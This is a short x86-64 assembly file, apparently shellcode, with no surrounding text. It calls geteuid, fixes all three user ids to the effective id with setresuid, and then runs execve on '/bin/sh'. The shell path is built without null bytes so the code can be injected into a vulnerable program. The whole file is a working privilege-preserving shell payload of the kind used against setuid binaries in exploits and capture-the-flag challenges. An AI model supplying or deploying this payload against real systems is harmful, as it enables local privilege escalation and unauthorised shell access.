bits 64
global _start
_start:
	; uid = geteuid()
	push	107
	pop	rax
	syscall

	; setresuid(uid, uid, uid)
	push	rax
	push	rax
	push	rax
	pop	rdi
	pop	rsi
	pop	rdx
	push	117
	pop	rax
	syscall

	; execve("/bin/sh", NULL, NULL)
	xor	rax, rax
	push	rax
	push	rax
	pop	rsi
	pop	rdx

	mov	rdi, 0x68732f6e69622faa
	shr	rdi, 8
	push	rdi
	push	rsp
	pop	rdi
	push	59
	pop	rax
	syscall
